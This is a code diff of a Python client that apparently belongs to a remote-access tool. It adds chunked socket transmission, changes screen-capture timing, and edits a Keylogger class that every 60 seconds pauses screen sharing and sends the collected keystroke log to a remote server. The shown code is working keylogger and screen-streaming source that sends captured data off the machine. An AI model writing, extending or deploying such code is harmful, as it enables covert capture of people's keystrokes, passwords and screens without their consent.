@@ -20,6 +20,8 @@ import numpy
 # NEW PROJECT UNIVERSAL SERVER SENDER/RECEIVER
 # MAKE SURE ALL MESSAGES FOLLOW THIS HEADER PATTERN
 # <TAG - 1 BYTE><DATA-CLASS - 7 BYTES><SIZE - 20 BYTES><DATA>
+
+
 class ScreenSharingClient:
     # ------------------------------------------------
     # The Client Brain LOL
@@ -75,40 +77,73 @@ class ScreenSharingClient:
     ):
         try:
             if not headerSEND or not dataclassSEND or not sizeSEND or not dataSEND:
-                pass
-            else:
-                if (
-                    headerSEND == "F"
-                    or headerSEND == "C"
-                    or headerSEND == "I"
-                    or headerSEND == "L"
-                    or headerSEND == "D"
-                ):
-                    if headerSEND == "F":
-                        if filenameSEND and filenameLengthSEND:
-                            self.socket.sendall(headerSEND.encode("utf-8"))
-                            self.socket.sendall(
-                                f"{dataclassSEND}{sizeSEND:020}{dataSEND}{filenameLengthSEND:020}{filenameSEND}".encode(
-                                    "utf-8"
-                                )
-                            )
-                        else:
-                            pass
-                    else:
-                        if isinstance(dataSEND, str):
-                            data_bytes = dataSEND.encode("utf-8")
-                        else:
-                            data_bytes = dataSEND
+                return
 
+            if headerSEND not in ["F", "C", "I", "L", "D"]:
+                return
+            if isinstance(dataSEND, str):
+                data_bytes = dataSEND.encode("utf-8")
+            else:
+                data_bytes = dataSEND
+
+            # Calculate chunking
+            chunk_size = 20000
+            needs_chunking = sizeSEND > chunk_size
+
+            if needs_chunking:
+                noOfChunks = (len(data_bytes) + chunk_size - 1) // chunk_size
+
+            # Handle File type with filename
+            if headerSEND == "F":
+                if not filenameSEND or not filenameLengthSEND:
+                    return
+
+                if needs_chunking:
+                    # Send each chunk with full header
+                    for i in range(0, len(data_bytes), chunk_size):
+                        chunk = data_bytes[i : i + chunk_size]
+                        currChunk = i // chunk_size + 1
+                        chunkAndTotal = f">{currChunk:020}{noOfChunks:020}<"
                         self.socket.sendall(headerSEND.encode("utf-8"))
                         self.socket.sendall(dataclassSEND.encode("utf-8"))
-                        self.socket.sendall(f"{sizeSEND:020}".encode("utf-8"))
-                        self.socket.sendall(data_bytes)
+                        self.socket.sendall(
+                            f"{len(chunkAndTotal) + len(chunk):020}".encode("utf-8")
+                        )
+                        self.socket.sendall(chunkAndTotal.encode("utf-8"))
+                        self.socket.sendall(chunk)
                 else:
-                    pass
+                    # Send without chunking
+                    self.socket.sendall(headerSEND.encode("utf-8"))
+                    self.socket.sendall(dataclassSEND.encode("utf-8"))
+                    self.socket.sendall(f"{sizeSEND:020}".encode("utf-8"))
+                    self.socket.sendall(data_bytes)
+                self.socket.sendall(f"{filenameLengthSEND:020}".encode("utf-8"))
+                self.socket.sendall(filenameSEND.encode("utf-8"))
+
+            # Handle other types (C, I, L, D)
+            else:
+                if needs_chunking:
+                    # Send each chunk with full header
+                    for i in range(0, len(data_bytes), chunk_size):
+                        chunk = data_bytes[i : i + chunk_size]
+                        currChunk = i // chunk_size + 1
+                        chunkAndTotal = f">{currChunk:020}{noOfChunks:020}<"
+                        self.socket.sendall(headerSEND.encode("utf-8"))
+                        self.socket.sendall(dataclassSEND.encode("utf-8"))
+                        self.socket.sendall(
+                            f"{len(chunkAndTotal) + len(chunk):020}".encode("utf-8")
+                        )
+                        self.socket.sendall(chunkAndTotal.encode("utf-8"))
+                        self.socket.sendall(chunk)
+                else:
+                    # Send without chunking
+                    self.socket.sendall(headerSEND.encode("utf-8"))
+                    self.socket.sendall(dataclassSEND.encode("utf-8"))
+                    self.socket.sendall(f"{sizeSEND:020}".encode("utf-8"))
+                    self.socket.sendall(data_bytes)
+
         except (ConnectionError, OSError):
             self.server_disconnection()
-            pass
 
     def receive_data(self):
         while True:
@@ -224,7 +259,7 @@ class ScreenSharingClient:
 
                 self.send_with_tag(tag, "screenV", len(packet), packet)
                 self.delta_base_frame = curr_frame
-                time.sleep(0.01)
+                time.sleep(0.1)
 
         except Exception as e:
             print("Error in screenshot loop:", e)
@@ -343,15 +378,16 @@ class Keylogger:
 
     async def send_log(self):
         while True:
-            await asyncio.sleep(50)
+            await asyncio.sleep(60)
             with self.lock:
                 if self.log:
                     if client.socket:
                         client.stop_screen_share()
                         await asyncio.sleep(5)
                         log_data = "\n".join(self.log)
-                        size = f"{len(log_data):020}"
-                        client.send_with_tag("L", "LoggerK", size, log_data)
+                        client.send_with_tag(
+                            "L", "LoggerK", int(len(log_data)), log_data
+                        )
                         self.log = []
                         client.start_screen_share()
                     else:
